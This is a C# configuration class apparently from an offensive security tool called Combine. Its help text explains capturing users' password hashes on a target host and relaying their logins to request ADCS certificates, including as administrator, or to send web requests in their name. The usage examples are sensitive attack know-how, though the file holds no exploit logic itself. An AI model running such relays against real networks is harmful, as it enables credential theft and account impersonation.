using System.Collections.Generic;

namespace Combine
{
    internal class Config
    {
        internal static int timer = 600;
        internal static int port = 8080;
        internal static string targetserver;
        internal static HashSet<string> targetusers = new HashSet<string>();
        internal static string template; 
        internal static int attack;
        internal static string postdata;
        internal static string contenttype;
        internal static string banner = "   __|               |    _)             \n  (      _ \\   ` \\    _ \\  |    \\    -_) \n \\___| \\___/ _|_|_| _.__/ _| _| _| \\___|\nAuthor: @mattsteer - matt@shadesecurity.com\n";
        internal static string help = "Combine.exe [options]\n\nCombine can be used as a replacement for farmer. Run the binary on a target host by some means and encourage users/hosts to visit.\n\n" +
            "Running Combine without options will output captured hashes to stdout, targeting any connecting user/host for 600 seconds\n\n" +
            "The following options are supported:\n" +
            "/attack\t\tinteger [0..3]\t\tThe attack to perform (see below).\n" +
            "/port\t\tinteger\t\t\tThe port to listen on.\n" +
            "/timer\t\tinteger\t\t\tThe time in seconds to run for.\n" +
            "/targetserver\tstring\t\t\tThe relay target host.\n" +
            "/targetusers\tcomma-seperated string\tThe list of users to attack.\n" +
            "/template\tstring\t\t\tThe certificate template to request from the CA.\n" +
            "/postdata\tstring\t\t\tA URL encoded string to send to the target server in post body.\n" +
            "/contenttype\tstring\t\t\tThe content-type of the post data.\n" +
            "/help\t\t\t\t\tYou're reading it!\n\n" +
            "Attacks:\n" +
            "0. Dump Hash - Dump hashes. - No arguments required\n" +
            "1. Certificate Request - Request a certificate from ADCS. - Requires: /targetserver /template\n" +
            "2. Get Request - Sends a GET request to the target server. Pass the full url to /targetserver including any parameters. - Requires: /targetserver\n" +
            "3. Post Request - Sends a POST request to the target server. Pass the full url to /targetserver, post body data should be URL encoded. - Requires: /targetserver /postdata /contenttype\n\n" +
            "Examples:\n\n" +
            "Combine.exe /port:8888 /timer:0 /attack:1 /targetuser:administrator /template:administrator /targetserver:http://ca.domain.com \n" +
            "Run Combine on port 8888 forever. Request certificates from ca.domain.com with a template = administrator only targeting username = administrator\n\n" +
            "Combine.exe /port:8080 /timer:300 /attack:2 /targetuser:user1,user2 /targetserver:http://web.domain.com/index.php?param=1\n" +
            "Run Combine on port 8080 for 300 seconds. Send GET requests to web.domain.com only targeting usernames user1 and user2\n\n" +
            "Combine.exe /port:8080 /timer:300 /attack:3 /targetuser:user1,user2 /targetserver:http://web.domain.com/index.php\n /postdata:param1=value1&param2=value2 /contenttype:text/plain\n" +
            "Run Combine on port 8080 for 300 seconds. Send POST requests to web.domain.com only targeting usernames user1 and user2\n\n";
    }
}

